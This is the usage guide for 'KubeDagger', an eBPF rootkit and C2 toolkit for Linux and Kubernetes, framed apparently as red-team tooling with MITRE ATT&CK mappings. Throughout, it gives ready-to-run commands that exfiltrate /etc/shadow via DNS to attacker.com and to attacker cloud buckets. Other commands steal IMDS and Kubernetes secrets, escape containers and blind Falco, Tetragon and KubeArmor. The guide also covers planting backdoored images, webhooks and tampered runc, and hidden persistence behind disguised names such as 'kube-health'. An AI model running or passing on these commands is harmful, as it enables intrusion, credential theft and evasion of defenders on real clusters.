# KubeDagger Usage Guide

## Table of Contents

- [Prerequisites](#prerequisites)
- [Building](#building)
- [Starting the Server](#starting-the-server)
- [Client Commands](#client-commands)
  - [Network Discovery](#1-network-discovery)
  - [File System Watch](#2-file-system-watch)
  - [Docker Image Override](#3-docker-image-override)
  - [PostgreSQL Credential Access](#4-postgresql-credential-access)
  - [Pipe Program Injection](#5-pipe-program-injection)
  - [TUI Dashboard](#6-tui-dashboard)
  - [DNS Exfiltration](#7-dns-exfiltration)
  - [Kubernetes Discovery](#8-kubernetes-discovery)
  - [Process Tree](#9-process-tree)
  - [MITRE ATT&CK Export](#10-mitre-attck-export)
  - [Kubernetes Privilege Escalation](#11-kubernetes-privilege-escalation)
  - [Container Escape](#12-container-escape)
  - [Secrets Harvesting](#13-secrets-harvesting)
  - [Runtime Security Evasion](#14-runtime-security-evasion)
  - [Network Policy Bypass](#15-network-policy-bypass)
  - [Service Mesh Bypass](#16-service-mesh-bypass)
  - [Observability Poisoning](#17-observability-poisoning)
  - [Cloud Metadata Theft](#18-cloud-metadata-theft)
  - [Cloud Exfiltration](#19-cloud-exfiltration)
  - [Admission Webhook Backdoor](#20-admission-webhook-backdoor)
  - [CRI-Level Image Tampering](#21-cri-level-image-tampering)
  - [DaemonSet Dropper](#22-daemonset-dropper)
- [Encrypted C2 Channel](#encrypted-c2-channel)
- [Persistence](#persistence)
- [Multi-Node Coordination](#multi-node-coordination)
- [Integration Testing](#integration-testing)

---

## Prerequisites

- Linux kernel 5.4+ with eBPF support (BTF-enabled for CO-RE portability)
- Go 1.25+
- Kernel headers installed (`/lib/modules/$(uname -r)`)
- clang & llvm 11+
- Root privileges (for loading eBPF programs)
- [Graphviz](https://graphviz.org/) (optional, for network graph generation)

## Building

```shell
# Build everything (server, client, webapp)
make

# Install client to /usr/bin/
make install_client
```

This produces binaries in `./bin/`:
- `kubedagger` — the server (loads eBPF programs)
- `kubedagger-client` — the C2 client
- `webapp` — the web-based control panel

---

## Starting the Server

```shell
# Basic usage (requires root)
sudo ./bin/kubedagger --ingress eth0 --egress eth0

# With custom C2 port
sudo ./bin/kubedagger -i eth0 -e eth0 -p 8080

# Disable network probes (useful for testing)
sudo ./bin/kubedagger -i eth0 -e eth0 --disable-network-probes

# With Docker interception
sudo ./bin/kubedagger -i eth0 -e eth0 --docker /usr/bin/dockerd

# With persistence (auto-reinstalls after reboot)
sudo ./bin/kubedagger -i eth0 -e eth0 --persist
```

### Server flags

| Flag | Default | Description |
|------|---------|-------------|
| `-i, --ingress` | `enp0s3` | Ingress network interface |
| `-e, --egress` | `enp0s3` | Egress network interface |
| `-p, --target-http-server-port` | `8000` | HTTP C2 port |
| `--docker` | `/usr/bin/dockerd` | Path to Docker daemon |
| `--postgres` | `/usr/lib/postgresql/12/bin/postgres` | Path to Postgres daemon |
| `--disable-network-probes` | `false` | Skip network eBPF probes |
| `--disable-bpf-obfuscation` | `false` | Don't hide from bpf syscall |
| `--persist` | `false` | Install persistence mechanism |
| `-l, --log-level` | `info` | Log level (trace/debug/info/warn/error) |

---

## Client Commands

The client communicates with the server over HTTP. Set the target with `--target` or the `KUBEDAGGER_TARGET` environment variable.

```shell
# Default target is http://localhost:8000
kubedagger-client --target http://10.0.2.5:8000 <command>

# Or use environment variable
export KUBEDAGGER_TARGET=http://10.0.2.5:8000
kubedagger-client <command>
```

---

### 1. Network Discovery

Discover hosts and open ports on the target's network.

```shell
# Get passively discovered network flows
kubedagger-client network_discovery get --passive

# Get actively scanned results
kubedagger-client network_discovery get --active

# Get both
kubedagger-client network_discovery get --passive --active

# Scan a range of ports on a target IP
kubedagger-client network_discovery scan --ip 192.168.1.1 --port 80 --range 100
```

**Flags:**
| Flag | Description |
|------|-------------|
| `--passive` | Show passively discovered flows |
| `--active` | Show actively scanned results |
| `--ip` | Starting IP for scan (format: X.X.X.X) |
| `--port` | Starting port number |
| `--range` | Number of ports to scan (default: 20) |

---

### 2. File System Watch

Exfiltrate file contents from the target system.

```shell
# Add a watch on a file
kubedagger-client fs_watch add /etc/shadow

# Add a watch on a file inside a container
kubedagger-client fs_watch add /etc/passwd --in-container

# Actively trigger a file read (don't wait for natural access)
kubedagger-client fs_watch add /etc/shadow --active

# Retrieve the watched file content
kubedagger-client fs_watch get /etc/shadow

# Save to local file
kubedagger-client fs_watch get /etc/shadow -o shadow_copy.txt

# Remove the watch
kubedagger-client fs_watch delete /etc/shadow
```

**Flags:**
| Flag | Description |
|------|-------------|
| `--in-container` | Target file is inside a container |
| `--active` | Actively trigger the file to be opened |
| `-o, --output` | Save output to a file |

---

### 3. Docker Image Override

Intercept and replace Docker images at runtime.

```shell
# List detected Docker images
kubedagger-client docker list
kubedagger-client docker list -o images.json

# Override an image (replace nginx with a backdoored version)
kubedagger-client docker put --from nginx:latest --to evil/nginx:latest --override 1

# Control ping response for an image (hide from health checks)
# 0=nop, 1=crash, 2=run, 3=hide
kubedagger-client docker put --from myapp:v1 --to myapp:v1 --ping 3

# Remove an override
kubedagger-client docker delete --from nginx:latest
```

**Flags:**
| Flag | Description |
|------|-------------|
| `--from` | Docker image to intercept |
| `--to` | Replacement image |
| `--override` | Action: 0=nop, 1=replace |
| `--ping` | Ping response: 0=nop, 1=crash, 2=run, 3=hide |

---

### 4. PostgreSQL Credential Access

Exfiltrate and manipulate PostgreSQL credentials.

```shell
# List captured Postgres credentials
kubedagger-client postgres list
kubedagger-client postgres list -o creds.json

# Override a role's password (role must exist)
kubedagger-client postgres put --role admin --secret "newpassword123"

# Remove the override
kubedagger-client postgres delete --role admin
```

**Flags:**
| Flag | Description |
|------|-------------|
| `--role` | PostgreSQL role name |
| `--secret` | New password/secret |
| `-o, --output` | Save output to file |

---

### 5. Pipe Program Injection

Intercept data flowing between two piped processes and inject a program.

```shell
# Inject a program between two processes
# Example: inject a keylogger between bash and sshd
kubedagger-client pipe_prog put my_program --from bash --to sshd

# With backup (re-inject original data after your program)
kubedagger-client pipe_prog put my_program --from bash --to sshd --backup

# Remove the injection
kubedagger-client pipe_prog delete --from bash --to sshd
```

**Flags:**
| Flag | Description |
|------|-------------|
| `--from` | Source process command (max 16 chars) |
| `--to` | Destination process command (max 16 chars) |
| `--backup` | Re-inject original data after program |

---

### 6. TUI Dashboard

Launch a real-time terminal UI showing live KubeDagger activity.

```shell
# Start the dashboard (default 2s refresh)
kubedagger-client dashboard

# Custom refresh rate
kubedagger-client dashboard --refresh 5

# Point at a remote target
kubedagger-client dashboard --target http://10.0.2.5:8000
```

**Keyboard controls:**
| Key | Action |
|-----|--------|
| `Tab` | Switch between panes |
| `1-4` | Jump to specific pane (Flows/FS/Docker/Processes) |
| `q` / `Ctrl+C` | Quit |

**Panes:**
1. **Network Flows** — Live network connections (color-coded by protocol)
2. **FS Watches** — Active file system watches and exfiltrated data
3. **Docker** — Image overrides in effect
4. **Processes** — Process activity on the target

---

### 7. DNS Exfiltration

Exfiltrate data through DNS queries when HTTP is blocked. Data is base32-encoded into DNS subdomain labels.

```shell
# Exfiltrate a file via DNS queries
kubedagger-client dns_exfil --file /etc/shadow --domain attacker.com

# Use a specific DNS server
kubedagger-client dns_exfil --file /etc/passwd --domain exfil.example.com --server 10.0.0.53
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--file` | (required) | Path to file to exfiltrate |
| `--domain` | (required) | Domain for DNS queries |
| `--server` | `8.8.8.8` | DNS server to send queries to |

**How it works:**
1. Reads the target file
2. Splits into 30-byte chunks
3. Base32-encodes each chunk
4. Sends as DNS TXT queries: `<seq_hex><encoded_chunk>.<domain>`
5. Terminates with `ffff.end.<domain>`

**Receiving side:** Run a DNS server that logs TXT queries for your domain, then decode the base32 chunks in sequence order.

---

### 8. Kubernetes Discovery

Enumerate Kubernetes cluster resources and identify attack targets.

```shell
# Discover all namespaces
kubedagger-client k8s discover

# Discover a specific namespace
kubedagger-client k8s discover --namespace kube-system

# Save report to file
kubedagger-client k8s discover -o cluster_report.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--namespace` | `all` | Namespace to enumerate (or "all") |
| `-o, --output` | stdout | Output file for JSON report |

**Output includes:**
- Nodes (name, IP, OS, kernel version)
- Pods (name, namespace, IP, images, node)
- Services (name, type, ClusterIP, ports)
- Namespaces
- **Targets** — automatically flagged:
  - Privileged containers
  - Pods with `hostPID: true`
  - Pods with `hostNetwork: true`

**Authentication:** Automatically detects:
1. In-cluster service account (`/var/run/secrets/kubernetes.io/serviceaccount/`)
2. Local kubeconfig (`~/.kube/config`)

---

### 9. Process Tree

Fetch and display the process tree from the target system.

```shell
# Get the process tree
kubedagger-client proctree get

# From a remote target
kubedagger-client proctree get --target http://10.0.2.5:8000
```

**Output:** Hierarchical tree showing PID, PPID, command name, and start time for all processes tracked by the eBPF probes.

---

### 10. MITRE ATT&CK Export

Generate MITRE ATT&CK technique mappings for all KubeDagger capabilities.

```shell
# Export as ATT&CK Navigator JSON layer
kubedagger-client mitre export --format json -o navigator_layer.json

# Export as markdown report
kubedagger-client mitre export --format markdown -o report.md

# Print to stdout
kubedagger-client mitre export --format markdown
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--format` | `json` | Output format: `json` or `markdown` |
| `-o, --output` | stdout | Output file path |

**Mapped techniques (25 total):**
| Technique | ID | KubeDagger Feature |
|-----------|----|--------------------|
| Implant Internal Image | T1525 | docker, webhook, cri-tamper |
| Network Service Scanning | T1046 | network_discovery |
| Data from Local System | T1005 | fs_watch |
| Process Injection | T1055 | pipe_prog |
| Application Layer Protocol: DNS | T1071.004 | dns_exfil |
| Hide Artifacts: Hidden Files | T1564.001 | file/process hiding |
| OS Credential Dumping | T1003 | postgres |
| Scheduled Task/Job: Cron | T1053.003 | persistence |
| Rootkit | T1014 | BPF program hiding |
| Traffic Signaling | T1205 | XDP-based C2 |
| Adversary-in-the-Middle | T1557 | DNS spoofing |
| Escape to Host | T1611 | container escape |
| System Information Discovery | T1082 | k8s discover |
| Application Layer Protocol: Web | T1071.001 | HTTP C2 |
| Impair Defenses | T1562.001 | evasion |
| Native API | T1106 | eBPF syscall |
| Cloud Instance Metadata API | T1552.005 | cloud meta |
| Valid Accounts: Cloud | T1078.004 | cloud meta |
| Credentials In Files | T1552.001 | secrets harvest |
| Steal Application Access Token | T1528 | secrets harvest |
| Network Boundary Bridging | T1599.001 | netbypass |
| Proxy: Domain Fronting | T1090.004 | meshbypass |
| Transfer Data to Cloud Account | T1537 | cloud exfil |
| Data Manipulation: Transmitted | T1565.002 | obs-poison |
| Container Orchestration Job | T1053.007 | daemonset |

The JSON output is compatible with the [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) for visualization.

---

### 11. Kubernetes Privilege Escalation

Exploit Kubernetes RBAC misconfigurations to escalate privileges within the cluster.

```shell
# Escalate privileges using current service account
kubedagger-client k8s abuse --action escalate

# Dump secrets from accessible namespaces
kubedagger-client k8s abuse --action dump-secrets

# Use a specific stolen token
kubedagger-client k8s abuse --action escalate --token "eyJhbGciOiJS..."
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--action` | (required) | Action: `escalate` or `dump-secrets` |
| `--token` | (auto-detect) | Bearer token to use for API calls |

---

### 12. Container Escape

Detect and execute container escape techniques based on the runtime environment.

```shell
# Detect available escape vectors
kubedagger-client escape --action detect

# Auto-select and execute the best escape technique
kubedagger-client escape --action execute --technique auto

# Use a specific escape technique
kubedagger-client escape --action execute --technique privileged
kubedagger-client escape --action execute --technique socket
kubedagger-client escape --action execute --technique cgroup
kubedagger-client escape --action execute --technique nsenter

# Save escape report
kubedagger-client escape --action detect -o escape_vectors.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--action` | (required) | `detect` (enumerate vectors) or `execute` (break out) |
| `--technique` | `auto` | Technique: `auto`, `privileged`, `socket`, `cgroup`, `nsenter` |
| `-o, --output` | stdout | Output file |

**Techniques:**
- **privileged** — Abuse `--privileged` container to mount host filesystem
- **socket** — Exploit exposed Docker/containerd socket
- **cgroup** — Abuse cgroup release_agent for code execution on host
- **nsenter** — Use `nsenter` with host PID namespace access

---

### 13. Secrets Harvesting

Harvest credentials and secrets from multiple sources on the target.

```shell
# Harvest from all available sources
kubedagger-client secrets harvest --sources all

# Target specific sources
kubedagger-client secrets harvest --sources env,k8s
kubedagger-client secrets harvest --sources cloud,vault

# Save harvested secrets
kubedagger-client secrets harvest --sources all -o secrets.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--sources` | `all` | Comma-separated: `all`, `env`, `k8s`, `cloud`, `docker`, `vault`, `kubeconfig` |
| `-o, --output` | stdout | Output file |

**Sources:**
- **env** — Environment variables (AWS keys, tokens, passwords)
- **k8s** — Kubernetes secrets from accessible namespaces
- **cloud** — Cloud provider metadata credentials
- **docker** — Docker config credentials (`~/.docker/config.json`)
- **vault** — HashiCorp Vault token files
- **kubeconfig** — Kubeconfig files with embedded credentials

---

### 14. Runtime Security Evasion

Evade runtime security tools by disabling or blinding their eBPF-based sensors.

```shell
# Evade all supported security tools
kubedagger-client evasion --mode all

# Target a specific tool
kubedagger-client evasion --mode falco
kubedagger-client evasion --mode tetragon
kubedagger-client evasion --mode kubearmor
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--mode` | (required) | Target: `falco`, `tetragon`, `kubearmor`, or `all` |

**How it works:**
- Detaches or corrupts the target tool's eBPF programs
- Patches syscall entry points to skip security hooks
- Modifies perf/ring buffer maps to drop events

---

### 15. Network Policy Bypass

Bypass Kubernetes NetworkPolicies and CNI-enforced network segmentation.

```shell
# Tunnel traffic through an allowed path
kubedagger-client netbypass --mode tunnel --dest-ip 10.0.5.3 --dest-port 443

# Spoof source identity to bypass policy selectors
kubedagger-client netbypass --mode spoof --dest-ip 10.0.5.3 --dest-port 80

# Encapsulate traffic to evade deep packet inspection
kubedagger-client netbypass --mode encap --dest-ip 10.0.5.3 --dest-port 8080

# Direct bypass via XDP (skip TC-level policy enforcement)
kubedagger-client netbypass --mode direct --dest-ip 10.0.5.3 --dest-port 443

# Save results
kubedagger-client netbypass --mode tunnel --dest-ip 10.0.5.3 --dest-port 443 -o bypass.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--mode` | (required) | Bypass method: `tunnel`, `spoof`, `encap`, `direct` |
| `--dest-ip` | (required) | Destination IP address |
| `--dest-port` | (required) | Destination port |
| `-o, --output` | stdout | Output file |

---

### 16. Service Mesh Bypass

Bypass service mesh sidecar proxies (Istio, Linkerd) to reach services directly.

```shell
# XDP-level bypass (fastest, skips sidecar entirely)
kubedagger-client meshbypass --mode xdp --mesh-target 10.0.3.5:8080

# UID-based bypass (send traffic as mesh proxy UID)
kubedagger-client meshbypass --mode uid --mesh-target 10.0.3.5:8080

# Raw socket bypass (avoid iptables redirect rules)
kubedagger-client meshbypass --mode raw --mesh-target 10.0.3.5:8080

# Exclude from mesh (modify pod annotations)
kubedagger-client meshbypass --mode exclude --mesh-target 10.0.3.5:8080
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--mode` | (required) | Method: `xdp`, `uid`, `raw`, `exclude` |
| `--mesh-target` | (required) | Target address (IP:port) |

---

### 17. Observability Poisoning

Poison observability pipelines to hide activity or create alert fatigue.

```shell
# Hide metrics from Prometheus
kubedagger-client obs-poison --target-system prometheus --endpoint http://prometheus:9090 --strategy hide

# Inject noise into OpenTelemetry
kubedagger-client obs-poison --target-system otel --endpoint http://otel-collector:4317 --strategy noise

# Create alert fatigue in StatsD
kubedagger-client obs-poison --target-system statsd --endpoint statsd:8125 --strategy fatigue

# Save poisoning report
kubedagger-client obs-poison --target-system prometheus --endpoint http://prometheus:9090 --strategy hide -o report.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--target-system` | (required) | Target: `prometheus`, `otel`, `statsd` |
| `--endpoint` | (required) | Endpoint URL/address of the target system |
| `--strategy` | (required) | Strategy: `hide` (suppress), `noise` (flood), `fatigue` (false alerts) |
| `-o, --output` | stdout | Output file |

---

### 18. Cloud Metadata Theft

Steal cloud instance credentials via the metadata service (IMDS).

```shell
# Auto-detect cloud provider and steal credentials
kubedagger-client cloud meta --provider auto

# Target a specific provider
kubedagger-client cloud meta --provider aws
kubedagger-client cloud meta --provider gcp
kubedagger-client cloud meta --provider azure
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--provider` | `auto` | Cloud provider: `auto`, `aws`, `gcp`, `azure` |

**What it retrieves:**
- **AWS** — IAM role credentials from `169.254.169.254/latest/meta-data/iam/`
- **GCP** — Service account tokens from `metadata.google.internal`
- **Azure** — Managed identity tokens from `169.254.169.254/metadata/identity/`

---

### 19. Cloud Exfiltration

Exfiltrate data to attacker-controlled cloud storage buckets.

```shell
# Exfil a file to S3 using stolen metadata credentials
kubedagger-client cloud exfil --provider aws --bucket exfil-bucket --file /etc/shadow --creds-from meta

# Exfil to GCS with manual credentials
kubedagger-client cloud exfil --provider gcp --bucket exfil-bucket --file /tmp/dump.tar.gz --creds-from manual

# Exfil to Azure Blob Storage
kubedagger-client cloud exfil --provider azure --bucket exfil-container --file /tmp/secrets.json --creds-from meta

# Save upload report
kubedagger-client cloud exfil --provider aws --bucket exfil-bucket --file /etc/shadow --creds-from meta -o upload.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--provider` | (required) | Cloud provider: `aws`, `gcp`, `azure` |
| `--bucket` | (required) | Destination bucket/container name |
| `--file` | (required) | Local file path to exfiltrate |
| `--creds-from` | `meta` | Credential source: `meta` (metadata service) or `manual` |
| `-o, --output` | stdout | Output file for upload report |

---

### 20. Admission Webhook Backdoor

Deploy a mutating admission webhook that injects a backdoor into new pods.

```shell
# Deploy the webhook backdoor
kubedagger-client webhook --action deploy --namespace kube-system --image evil/injector:latest

# Check webhook status
kubedagger-client webhook --action deploy --namespace kube-system --image evil/injector:latest -o status.json

# Remove the webhook
kubedagger-client webhook --action remove --namespace kube-system
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--action` | (required) | `deploy` or `remove` |
| `--namespace` | `default` | Namespace for webhook resources |
| `--image` | (required for deploy) | Container image for the webhook server |
| `-o, --output` | stdout | Output file |

**How it works:**
1. Creates a MutatingWebhookConfiguration targeting pod creation
2. Deploys a webhook server that injects a sidecar container into new pods
3. The sidecar runs the specified image with host-level access

---

### 21. CRI-Level Image Tampering

Tamper with container images at the Container Runtime Interface level, bypassing image pull verification.

```shell
# Overlay filesystem tampering (containerd)
kubedagger-client cri-tamper --runtime containerd --mode overlay --target-image nginx:latest --inject-binary /tmp/backdoor

# Content-addressable storage manipulation (CRI-O)
kubedagger-client cri-tamper --runtime crio --mode cas --target-image webapp:v1 --inject-binary /tmp/implant

# Runc binary replacement
kubedagger-client cri-tamper --runtime containerd --mode runc --target-image "*" --inject-binary /tmp/evil-runc

# Save tampering report
kubedagger-client cri-tamper --runtime containerd --mode overlay --target-image nginx:latest --inject-binary /tmp/backdoor -o tamper.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--runtime` | (required) | Container runtime: `containerd` or `crio` |
| `--mode` | (required) | Tampering mode: `overlay`, `cas`, `runc` |
| `--target-image` | (required) | Image to tamper with (or `*` for runc mode) |
| `--inject-binary` | (required) | Path to binary to inject |
| `-o, --output` | stdout | Output file |

**Modes:**
- **overlay** — Modify the overlay filesystem layers after image extraction
- **cas** — Manipulate content-addressable storage blobs directly
- **runc** — Replace the runc binary to inject code at container start

---

### 22. DaemonSet Dropper

Deploy KubeDagger as a DaemonSet for cluster-wide rootkit installation across all nodes.

```shell
# Deploy the DaemonSet
kubedagger-client daemonset --action deploy --image kubedagger:latest --name kube-health --namespace kube-system

# Check deployment status
kubedagger-client daemonset --action status --name kube-health --namespace kube-system

# Remove the DaemonSet
kubedagger-client daemonset --action remove --name kube-health --namespace kube-system

# Save status report
kubedagger-client daemonset --action status --name kube-health --namespace kube-system -o status.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--action` | (required) | `deploy`, `remove`, or `status` |
| `--image` | (required for deploy) | Container image to deploy |
| `--name` | `kube-health` | DaemonSet name |
| `--namespace` | `kube-system` | Target namespace |
| `-o, --output` | stdout | Output file |

**How it works:**
1. Creates a privileged DaemonSet with `hostPID`, `hostNetwork`, and volume mounts
2. Each pod loads KubeDagger's eBPF programs on its node
3. Uses legitimate-sounding names to blend with system workloads
4. Tolerates all taints to ensure deployment on every node (including control plane)

---

## Encrypted C2 Channel

An alternative to the HTTP-based C2 that uses ChaCha20-Poly1305 encryption over raw TCP.

### Server setup

```shell
# Generate a key
KEY=$(kubedagger-client c2 genkey)
echo $KEY

# Start server with encrypted C2
sudo ./bin/kubedagger -i eth0 -e eth0 --c2-port 9001 --c2-key $KEY
```

### Client usage

```shell
# Connect via encrypted channel
kubedagger-client --encrypted --c2-key $KEY --target 10.0.2.5:9001 <command>
```

### Protocol details

- **Cipher:** ChaCha20-Poly1305 (AEAD)
- **Key:** 256-bit pre-shared key (64-char hex string)
- **Frame format:** `[4-byte length][12-byte nonce][ciphertext][16-byte auth tag]`
- **Heartbeat:** Empty encrypted message every 30 seconds
- **Max message:** 64KB

### Key generation

```shell
# Generate a random 256-bit key (hex encoded)
kubedagger-client c2 genkey
# Output: a]64-character hex string

# Or use any 64-char hex string
export C2_KEY="deadbeef..."
```

---

## Persistence

The persistence module ensures KubeDagger survives system reboots.

### Installation

```shell
# Enable persistence during startup
sudo ./bin/kubedagger -i eth0 -e eth0 --persist
```

### What it does

1. **Copies binary** to `/usr/lib/kubedagger/.kd`
2. **Hides the file** using eBPF-based file hiding (ext4)
3. **Installs systemd service** named `kube-health-monitor.service` (preferred)
4. **Falls back to cron** `@reboot` entry if systemd is unavailable

### Removal

```shell
# Remove persistence (run from a shell on the target)
sudo ./bin/kubedagger --remove-persist
```

This removes:
- The hidden binary
- The systemd service (or cron entry)
- The installation directory

---

## Multi-Node Coordination

When running KubeDagger on multiple nodes, they can share topology data.

### Setup

```shell
# Node 1
sudo ./bin/kubedagger -i eth0 -e eth0 --c2-port 9001 --c2-key $KEY

# Node 2 (connects to Node 1 as peer)
sudo ./bin/kubedagger -i eth0 -e eth0 --c2-port 9001 --c2-key $KEY \
  --peers 10.0.2.3:9001

# Node 3 (connects to both)
sudo ./bin/kubedagger -i eth0 -e eth0 --c2-port 9001 --c2-key $KEY \
  --peers 10.0.2.3:9001,10.0.2.4:9001
```

### How it works

- **Heartbeat** (every 30s): Nodes exchange alive status
- **Topology sync** (every 60s): Nodes share network flows and process data
- **Peer timeout** (90s): Peers marked dead if no heartbeat received
- **Merged view**: Any node can serve the combined topology from all peers

### Querying multi-node data

```shell
# Get merged network flows from all nodes
kubedagger-client network_discovery get --passive --all-nodes

# The dashboard shows data from all connected peers
kubedagger-client dashboard
```

---

## Example Workflow

A typical engagement workflow:

```shell
# 1. Deploy and start (with persistence)
sudo ./bin/kubedagger -i eth0 -e eth0 --persist --c2-port 9001 --c2-key $KEY

# 2. Discover the network
kubedagger-client network_discovery scan --ip 192.168.1.1 --port 1 --range 1024

# 3. If in Kubernetes, enumerate the cluster
kubedagger-client k8s discover -o cluster.json

# 4. Watch sensitive files
kubedagger-client fs_watch add /etc/shadow --active
kubedagger-client fs_watch get /etc/shadow -o shadow.txt

# 5. If HTTP is blocked, exfiltrate via DNS
kubedagger-client dns_exfil --file /etc/shadow --domain data.attacker.com

# 6. Monitor everything in real-time
kubedagger-client dashboard

# 7. Override a Docker image for lateral movement
kubedagger-client docker put --from webapp:v1 --to evil/webapp:v1 --override 1

# 8. Generate MITRE report for documentation
kubedagger-client mitre export --format markdown -o report.md

# 9. View process tree
kubedagger-client proctree get
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| `permission denied` loading eBPF | Run with `sudo` or `CAP_BPF` + `CAP_NET_ADMIN` |
| `kernel headers not found` | Install `linux-headers-$(uname -r)` |
| Client can't connect | Check `--target` URL and ensure server is running |
| Dashboard shows no data | Verify the server is reachable and has active probes |
| DNS exfil not working | Ensure outbound UDP/53 is allowed; try a different `--server` |
| K8s discovery fails | Check service account permissions or kubeconfig path |
| Persistence not surviving | Verify systemd is running or cron is enabled |
| Container escape fails | Verify container is privileged or has required capabilities |
| Cloud meta returns empty | Check IMDS accessibility (some environments block `169.254.169.254`) |

---

## Integration Testing

KubeDagger includes integration tests that load eBPF programs into the kernel and verify correct attachment.

```shell
# Run integration tests (requires root and BTF-enabled kernel)
sudo $(which go) test -tags integration -v -count=1 -timeout 60s ./pkg/kubedagger/
```

The integration tests use build tag `integration` and are separate from unit tests. They verify:
- BPF programs load successfully via the BPF verifier
- All kprobe/uprobe/XDP/TC programs attach to their hooks
- Key BPF maps (`http_routes`, `dns_table`, `piped_progs`, `comm_prog_key`) are accessible

CI runs these automatically on every push using GitHub Actions runners with BTF-enabled kernels.
